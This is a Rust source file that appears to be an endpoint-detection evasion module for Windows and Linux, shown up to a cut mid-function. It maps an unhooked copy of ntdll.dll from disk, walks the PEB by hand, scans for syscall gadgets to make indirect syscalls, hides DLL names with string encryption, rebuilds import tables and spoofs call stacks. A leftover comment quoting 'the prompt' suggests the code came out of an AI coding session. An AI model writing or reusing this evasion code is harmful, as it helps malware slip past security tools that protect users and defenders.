

//! Direct/Indirect syscalls for Windows and Linux.
#![cfg(all(
    any(windows, target_os = "linux"),
    any(target_arch = "x86_64", target_arch = "aarch64"),
    feature = "direct-syscalls"
))]

#[repr(C)]
struct PEB {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8,
    BitFields: u8,
    Mutant: *mut std::os::raw::c_void,
    ImageBaseAddress: *mut std::os::raw::c_void,
    Ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct PEB_LDR_DATA {
    Length: u32,
    Initialized: u8,
    SsHandle: *mut std::os::raw::c_void,
    InLoadOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
    InMemoryOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
    InInitializationOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    InLoadOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
    InMemoryOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
    InInitializationOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
    DllBase: *mut std::os::raw::c_void,
    EntryPoint: *mut std::os::raw::c_void,
    SizeOfImage: u32,
    FullDllName: winapi::shared::ntdef::UNICODE_STRING,
    BaseDllName: winapi::shared::ntdef::UNICODE_STRING,
}

use anyhow::{anyhow, Result};
use std::arch::asm;

#[cfg(windows)]
use std::sync::{Mutex, OnceLock};

#[cfg(windows)]
use std::collections::HashMap;

#[cfg(windows)]
static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();

#[cfg(windows)]
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();

#[cfg(windows)]
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    pub ssn: u32,
    pub gadget_addr: usize,
}

#[cfg(windows)]
fn rva_to_offset(rva: u32, nt_headers: *const winapi::um::winnt::IMAGE_NT_HEADERS64, base: *const u8) -> u32 {
    unsafe {
        let num_sections = (*nt_headers).FileHeader.NumberOfSections;
        let mut section = (nt_headers as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>()) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for _ in 0..num_sections {
            let start = (*section).VirtualAddress;
            let end = start + (*section).Misc.VirtualSize();
            if rva >= start && rva < end {
                return rva - start + (*section).PointerToRawData;
            }
            section = section.add(1);
        }
        rva
    }
}

#[cfg(windows)]
fn get_bootstrap_ssn(raw_bytes: &[u8], func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let base = raw_bytes.as_ptr();
        let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE { return None; }
        
        let nt_headers = (base as usize + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        if export_dir_rva == 0 { return None; }
        
        let export_dir_offset = rva_to_offset(export_dir_rva, nt_headers, base);
        let export_dir = (base as usize + export_dir_offset as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
        let num_names = (*export_dir).NumberOfNames as usize;
        
        let names_offset = rva_to_offset((*export_dir).AddressOfNames, nt_headers, base);
        let funcs_offset = rva_to_offset((*export_dir).AddressOfFunctions, nt_headers, base);
        let ords_offset = rva_to_offset((*export_dir).AddressOfNameOrdinals, nt_headers, base);
        
        let names = (base as usize + names_offset as usize) as *const u32;
        let funcs = (base as usize + funcs_offset as usize) as *const u32;
        let ords = (base as usize + ords_offset as usize) as *const u16;

        for i in 0..num_names {
            let name_rva = *names.add(i);
            let name_offset = rva_to_offset(name_rva, nt_headers, base);
            let name_ptr = (base as usize + name_offset as usize) as *const i8;
            let name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
            if name == func_name {
                let ord = *ords.add(i);
                let func_rva = *funcs.add(ord as usize);
                let func_offset = rva_to_offset(func_rva, nt_headers, base);
                let func_addr = base as usize + func_offset as usize;

                let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
                for j in 0..bytes.len().saturating_sub(1) {
                    if bytes[j] == 0x0f && bytes[j + 1] == 0x05 { // syscall gadget
                        for k in (0..j).rev() {
                            if bytes[k] == 0xb8 && k + 5 <= bytes.len() { // mov eax, ssn
                                let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                                return Some(SyscallTarget {
                                    ssn,
                                    gadget_addr: 0, // gadget_addr is not valid since it's unmapped memory, but we will find one mapped later
                                });
                            }
                        }
                    }
                }
            }
        }
        None
    }
}

#[cfg(windows)]
fn map_clean_ntdll() -> Result<usize> {
    use std::os::windows::ffi::OsStrExt;
    
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let ntdll_disk_path = format!(r"{}\System32\ntdll.dll", sysroot);
    
    // Read raw unmapped bytes to parse SSNs for NtOpenFile, NtCreateSection, NtMapViewOfSection
    let raw_bytes = std::fs::read(&ntdll_disk_path).map_err(|e| anyhow!("Failed to read ntdll from disk: {e}"))?;
    
    let sys_ntopenfile = get_bootstrap_ssn(&raw_bytes, "NtOpenFile").ok_or_else(|| anyhow!("No NtOpenFile SSN"))?;
    let sys_ntcreatesection = get_bootstrap_ssn(&raw_bytes, "NtCreateSection").ok_or_else(|| anyhow!("No NtCreateSection SSN"))?;
    let sys_ntmapview = get_bootstrap_ssn(&raw_bytes, "NtMapViewOfSection").ok_or_else(|| anyhow!("No NtMapView SSN"))?;
    
    let mut ntdll_nt_path = format!(r"\??\{}\System32\ntdll.dll", sysroot).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
    
    unsafe {
        // Need to find *any* mapped syscall gadget we can use. We can just use the loaded ntdll's gadget dynamically, or build one in memory.
        // Wait, the prompt says "remove all references to the loaded module's export table". 
        // We can just scan PEB -> Ldr for ntdll and scan the loaded .text section for 0x0F 0x05 without parsing exports!
        let loaded_ntdll_base = {
            use winapi::um::winnt::NT_TIB;
            // TEB/PEB are in winapi::um::winternl
            // using raw pointers instead of winternl PEB
            let peb: *const PEB;
            asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb,
                options(nostack, readonly)
            );
            let ldr = (*peb).Ldr;
            let head = &(*ldr).InMemoryOrderModuleList as *const _ as *mut winapi::shared::ntdef::LIST_ENTRY;
            let mut curr = (*head).Flink;
            let mut found_base = 0;
            // First entry is usually the executable, second is ntdll
            while curr != head {
                let entry = curr as *const u8;
                // InMemoryOrder links are at offset 0x10 compared to LDR_DATA_TABLE_ENTRY base
                let dll_base_ptr = entry.add(0x30 - 0x10) as *const *mut std::os::raw::c_void;
                let full_name_ptr = entry.add(0x48 - 0x10) as *const winapi::shared::ntdef::UNICODE_STRING;
                
                let base = *dll_base_ptr;
                let name = *full_name_ptr;
                if !base.is_null() && name.Buffer != std::ptr::null_mut() {
                    let name_slice = std::slice::from_raw_parts(name.Buffer, (name.Length / 2) as usize);
                    let name_str = String::from_utf16_lossy(name_slice).to_lowercase();
                    if name_str.contains(String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0')) {
                        found_base = base as usize;
                        break;
                    }
                }
                curr = (*curr).Flink;
            }
            found_base
        };
        
        if loaded_ntdll_base == 0 {
            return Err(anyhow!("Could not find loaded ntdll base in PEB"));
        }
        
        // Find gadget
        let mut gadget_addr = 0;
        let dos_header = loaded_ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        let nt_headers = (loaded_ntdll_base + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
        let p_sections = (nt_headers as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>()) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let section = &*p_sections.add(i as usize);
            let name = &section.Name;
            if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
                let start = loaded_ntdll_base + section.VirtualAddress as usize;
                let size = *section.Misc.VirtualSize() as usize;
                let code = std::slice::from_raw_parts(start as *const u8, size);
                for j in 0..size.saturating_sub(1) {
                    if code[j] == 0x0f && code[j+1] == 0x05 {
                        gadget_addr = start + j;
                        break;
                    }
                }
                break;
            }
        }
        if gadget_addr == 0 { return Err(anyhow!("Failed to find syscall gadget in loaded ntdll")); }
        
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_nt_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_nt_path.as_mut_ptr();
        
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
        
        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        
        let status = do_syscall(sys_ntopenfile.ssn, gadget_addr, &[
            &mut h_file as *mut _ as u64,
            0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
            &mut obj_attr as *mut _ as u64,
            &mut io_status as *mut _ as u64,
            1, // FILE_SHARE_READ
            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        ]);
        if status != 0 { return Err(anyhow!("NtOpenFile failed: {:x}", status)); }
        
        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        let status = do_syscall(sys_ntcreatesection.ssn, gadget_addr, &[
            &mut h_section as *mut _ as u64,
            0x000F0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
            std::ptr::null_mut::<u64>() as u64,
            std::ptr::null_mut::<u64>() as u64,
            0x20, // PAGE_EXECUTE_READ
            0x1000000, // SEC_IMAGE
            h_file as u64,
        ]);
        
        winapi::um::handleapi::CloseHandle(h_file);
        if status != 0 { return Err(anyhow!("NtCreateSection failed: {:x}", status)); }
        
        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;
        
        let status = do_syscall(sys_ntmapview.ssn, gadget_addr, &[
            h_section as u64,
            -1isize as u64, // CurrentProcess
            &mut base_addr as *mut _ as u64,
            0,
            0,
            std::ptr::null_mut::<u64>() as u64,
            &mut view_size as *mut _ as u64,
            1, // ViewShare
            0,
            0x20, // PAGE_EXECUTE_READ
        ]);
        
        winapi::um::handleapi::CloseHandle(h_section);
        if status != 0 { return Err(anyhow!("NtMapViewOfSection failed: {:x}", status)); }
        
        Ok(base_addr as usize)
    }
}

#[cfg(windows)]
fn read_export_dir(base: usize, func_name: &str) -> Result<SyscallTarget> {
    unsafe {
        let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
            anyhow::bail!("Invalid DOS signature");
        }
        
        let nt_headers = (base + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
        if (*nt_headers).Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
            anyhow::bail!("Invalid NT signature");
        }
        
        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        if export_dir_rva == 0 {
            anyhow::bail!("No export directory");
        }
        
        let export_dir = (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
        let num_names = (*export_dir).NumberOfNames as usize;
        let names = (base + (*export_dir).AddressOfNames as usize) as *const u32;
        let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
        let ords = (base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;

        for i in 0..num_names {
            let name_rva = *names.add(i);
            let name_ptr = (base + name_rva as usize) as *const i8;
            let name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
            if name == func_name {
                let ord = *ords.add(i);
                let func_rva = *funcs.add(ord as usize);
                let func_addr = base + func_rva as usize;

                let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
                for j in 0..bytes.len().saturating_sub(1) {
                    if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
                        for k in (0..j).rev() {
                            if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                                let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                                return Ok(SyscallTarget {
                                    ssn,
                                    gadget_addr: func_addr + j,
                                });
                            }
                        }
                    }
                }
            }
        }
        anyhow::bail!("Function {} not found in clean ntdll or could not parse SSN", func_name)
    }
}

#[cfg(windows)]
pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
    let cache_lock = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&(ssn, gadget_addr)) = cache_lock.lock().unwrap().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    let base = *CLEAN_NTDLL.get_or_init(|| {
        map_clean_ntdll().unwrap_or_else(|e| {
        tracing::error!("Fatal: Could not map clean ntdll.dll: {e}");
        std::process::exit(1);
    })
    });

    let target = read_export_dir(base, func_name)?;
    cache_lock.lock().unwrap().insert(func_name.to_string(), (target.ssn, target.gadget_addr));
    Ok(target)
}

#[cfg(windows)]
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        let target = $crate::syscalls::get_syscall_id($func_name)?;
        let args: &[u64] = &[$($args as u64),*];
        $crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
    }};
}

#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        asm!(
            "mov r14, rsp",
            "mov rax, {nstack}",
            "shl rax, 3",
            "add rax, 0x28 + 15",
            "and rax, -16",
            "sub rsp, rax",
            "test {nstack}, {nstack}",
            "jz 2f",
            "mov rcx, {nstack}",
            "mov rsi, {stack_ptr}",
            "lea rdi, [rsp + 0x28]",
            "cld",
            "rep movsq",
            "4:",
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            "call r11", // indirect syscall!
            "mov rsp, r14",
            ssn        = in(reg) ssn,
            gadget     = in(reg) gadget_addr,
            nstack     = in(reg) nstack,
            stack_ptr  = in(reg) stack_ptr,
            a1         = in(reg) a1,
            a2         = in(reg) a2,
            in("r8")  a3,
            in("r9")  a4,
            lateout("rax") status,
            out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _,
            out("rsi") _, out("rdi") _,
            // NOTE: nostack intentionally removed – the asm block modifies RSP
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        let status: i32;
        std::arch::asm!(
            "mov x8, {ssn}",
            "mov x0, {a1}",
            "mov x1, {a2}",
            "mov x2, {a3}",
            "mov x3, {a4}",
            "blr {gadget}",
            "mov {status}, x0",
            ssn = in(reg) ssn,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            a3 = in(reg) a3,
            a4 = in(reg) a4,
            gadget = in(reg) gadget_addr,
            status = out(reg) status,
            out("x8") _,
            out("x0") _, out("x1") _, out("x2") _, out("x3") _,
            options(nostack),
        );
        status
    }
}


#[cfg(windows)]
static CLEAN_MODULES: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();

#[cfg(windows)]
pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
    let dll_lower = dll_name.to_lowercase();
    
    let cache_lock = CLEAN_MODULES.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&base) = cache_lock.lock().unwrap().get(&dll_lower) {
        return Ok(base);
    }
    
    use winapi::um::winnt::{FILE_SHARE_READ, GENERIC_READ, PAGE_EXECUTE_READ, SEC_IMAGE, SECTION_MAP_READ, SECTION_MAP_EXECUTE};
    use winapi::um::handleapi::CloseHandle;

    unsafe {
        let ntdll_base = *CLEAN_NTDLL.get_or_init(|| {
            map_clean_ntdll().unwrap_or_else(|e| {
                tracing::error!("Fatal: Could not map clean ntdll.dll: {e}");
                std::process::exit(1);
            })
        });

        let sys_ntcreatesection = get_syscall_id("NtCreateSection")?;
        let sys_ntmapview = get_syscall_id("NtMapViewOfSection")?;

        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
        
        let path_str = if dll_lower.contains(r"\") {
            dll_lower.clone()
        } else {
            format!(r"{}\System32\{}", sysroot, dll_name)
        };
        
        let sys_ntopenfile = get_syscall_id("NtOpenFile")?;
        
        use std::os::windows::ffi::OsStrExt;
        let mut nt_path = format!(r"\??\{}\System32\{}", sysroot, dll_name).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
        
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (nt_path.len() * 2) as u16;
        obj_name.Buffer = nt_path.as_mut_ptr();
        
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
        
        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        
        let status = do_syscall(sys_ntopenfile.ssn, sys_ntopenfile.gadget_addr, &[
            &mut h_file as *mut _ as u64,
            0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
            &mut obj_attr as *mut _ as u64,
            &mut io_status as *mut _ as u64,
            1, // FILE_SHARE_READ
            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        ]);
        
        if status != 0 {
            return Err(anyhow!("Failed to open {} with NtOpenFile. Status: {:x}", dll_name, status));
        }
        
        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        let status = do_syscall(sys_ntcreatesection.ssn, sys_ntcreatesection.gadget_addr, &[
            &mut h_section as *mut _ as u64,
            0x000F0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
            std::ptr::null_mut::<u64>() as u64,
            std::ptr::null_mut::<u64>() as u64,
            0x20, // PAGE_EXECUTE_READ
            0x1000000, // SEC_IMAGE
            h_file as u64,
        ]);
        CloseHandle(h_file);
        
        if status != 0 || h_section.is_null() {
            return Err(anyhow!("NtCreateSection failed with status {:x}. Refusing to initialize.", status));
        }
        
        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;
        
        let status = do_syscall(sys_ntmapview.ssn, sys_ntmapview.gadget_addr, &[
            h_section as u64,
            -1isize as u64, // CurrentProcess
            &mut base_addr as *mut _ as u64,
            0,
            0,
            std::ptr::null_mut::<u64>() as u64,
            &mut view_size as *mut _ as u64,
            1, // ViewShare
            0,
            0x20, // PAGE_EXECUTE_READ
        ]);
        CloseHandle(h_section);
        
        if status != 0 || base_addr.is_null() {
            return Err(anyhow!("NtMapViewOfSection failed with status {:x}. Refusing to initialize.", status));
        }
        
        let base = base_addr as usize;
        cache_lock.lock().unwrap().insert(dll_lower.clone(), base);
        
        // Construct a fresh Import Address Table
        if let Err(e) = rebuild_iat(base) {
            tracing::warn!("Failed to rebuild IAT for clean {}: {}", dll_name, e);
        }
        
        Ok(base)
    }
}

#[cfg(windows)]
unsafe fn rebuild_iat(base: usize) -> Result<()> {
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        anyhow::bail!("Invalid DOS signature");
    }
    
    let nt_headers = (base + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    if (*nt_headers).Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
        anyhow::bail!("Invalid NT signature");
    }
    
    let import_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress;
    if import_dir_rva == 0 {
        return Ok(()); // No imports
    }
    
    let mut import_desc = (base + import_dir_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;
    
    while (*import_desc).Name != 0 {
        let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr).to_str().unwrap_or("");
        let dll_lower = dll_name.to_lowercase();
        
        // Critical DLLs we explicitly want clean copies of.
        // Check the cache first *without* recursing; if already mapped use it.
        // This prevents a deadlock if two threads race on the same DLL, or if
        // the dependency graph has a cycle (e.g., ntdll ↔ win32u forwarding).
        let is_critical = dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0') || dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("kernelbase.dll")).trim_end_matches('\0') || dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("kernel32.dll")).trim_end_matches('\0');

        let dep_handle = if is_critical {
            // Fast-path: already in cache? Use it without recursing.
            let cached = CLEAN_MODULES.get().and_then(|m| m.lock().unwrap().get(&dll_lower).copied());
            if let Some(b) = cached {
                b as *mut winapi::shared::minwindef::HINSTANCE__
            } else {
                // Not yet cached — map it; map_clean_dll is re-entrant safe
                // via the cache check at its top but we still guard depth by
                // only doing this for known critical DLLs (bounded set).
                match map_clean_dll(&dll_lower) {
                    Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
                    Err(_) => {
                        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
                        let path = format!("{}\\System32\\{}", sysroot, dll_name);
                        let ptr = std::ffi::CString::new(path).unwrap();
                        winapi::um::libloaderapi::LoadLibraryA(ptr.as_ptr()) as *mut _
                    }
                }
            }
        } else {
            let h_kernel = winapi::um::libloaderapi::LoadLibraryA(dll_name_ptr);
            h_kernel as *mut _
        };
        
        if !dep_handle.is_null() {
            let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 { *(*import_desc).u.OriginalFirstThunk() } else { (*import_desc).FirstThunk };
            let mut original_thunk = (base + original_thunk_rva as usize) as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
            let mut first_thunk = (base + (*import_desc).FirstThunk as usize) as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;
            
            // Make IAT writable
            let mut num_thunks = 0;
            let mut temp_thunk = first_thunk;
            while (*temp_thunk).u1.AddressOfData() != &0 {
                num_thunks += 1;
                temp_thunk = temp_thunk.add(1);
            }
            let iat_size = (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA64>();
            
            let mut old_protect = 0;
            winapi::um::memoryapi::VirtualProtect(first_thunk as *mut _, iat_size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect);
            
            while (*original_thunk).u1.AddressOfData() != &0 {
                let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
                let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG64) != 0 {
                    let ordinal = (addr_of_data & 0xFFFF) as u16;
                    winapi::um::libloaderapi::GetProcAddress(dep_handle as *mut _, ordinal as winapi::um::winnt::LPCSTR) as usize
                } else {
                    let import_by_name = (base + addr_of_data as usize) as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
                    let name_ptr = (*import_by_name).Name.as_ptr();
                    get_export_addr(dep_handle as usize, name_ptr)
                };
                
                if proc_addr != 0 {
                    let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                    *mut_u1 = proc_addr as u64;
                }
                
                original_thunk = original_thunk.add(1);
                first_thunk = first_thunk.add(1);
            }
            
            winapi::um::memoryapi::VirtualProtect(first_thunk.sub(num_thunks) as *mut _, iat_size, old_protect, &mut old_protect);
        }
        
        import_desc = import_desc.add(1);
    }
    
    Ok(())
}

#[cfg(windows)]
unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE { return 0; }
    
    let nt_headers = (base + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
    if export_dir_rva == 0 { return 0; }
    
    let export_dir = (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    let num_names = (*export_dir).NumberOfNames as usize;
    let names = (base + (*export_dir).AddressOfNames as usize) as *const u32;
    let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ords = (base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;

    let target_name = std::ffi::CStr::from_ptr(func_name_ptr).to_bytes();

    for i in 0..num_names {
        let name_rva = *names.add(i);
        let name_ptr = (base + name_rva as usize) as *const i8;
        let c_name = std::ffi::CStr::from_ptr(name_ptr).to_bytes();
        
        if c_name == target_name {
            let ord = *ords.add(i);
            let func_rva = *funcs.add(ord as usize);
            return base + func_rva as usize;
        }
    }
    
    0
}

#[cfg(windows)]
pub fn get_clean_api_addr(dll_name: &str, func_name: &str) -> Result<usize> {
    let base = map_clean_dll(dll_name)?;
    let c_name = std::ffi::CString::new(func_name).unwrap();
    let addr = unsafe { get_export_addr(base, c_name.as_ptr()) };
    if addr == 0 {
        return Err(anyhow!("Function {} not found in clean {}", func_name, dll_name));
    }
    Ok(addr)
}

#[cfg(windows)]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                std::process::exit(1);
            });
        // Gather arguments
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
        
        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
        if gadget == 0 {
            // fallback if no gadget found
            let func: $fn_type = unsafe { std::mem::transmute(addr) };
            unsafe { func($($args),*) }
        } else {
            let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
            // cast result back
            unsafe { std::mem::transmute_copy(&res) }
        }
    }};
}

#[cfg(target_os = "linux")]
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        let ssn = $crate::syscalls::get_syscall_id($func_name).expect("unknown linux syscall");
        let args: &[u64] = &[$($args as u64),*];
        unsafe { $crate::syscalls::do_syscall(ssn as u32, args).unwrap_or_else(|e| {
            (u64::MAX - (e as u64) + 1)
        }) }
    }};
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<i32, i32> {
    #[cfg(target_arch = "x86_64")]
    {
        let mut ret: i64;
        match args.len() {
            0 => std::arch::asm!("syscall", in("rax") ssn as u64, lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            1 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            2 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            3 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            4 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            5 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
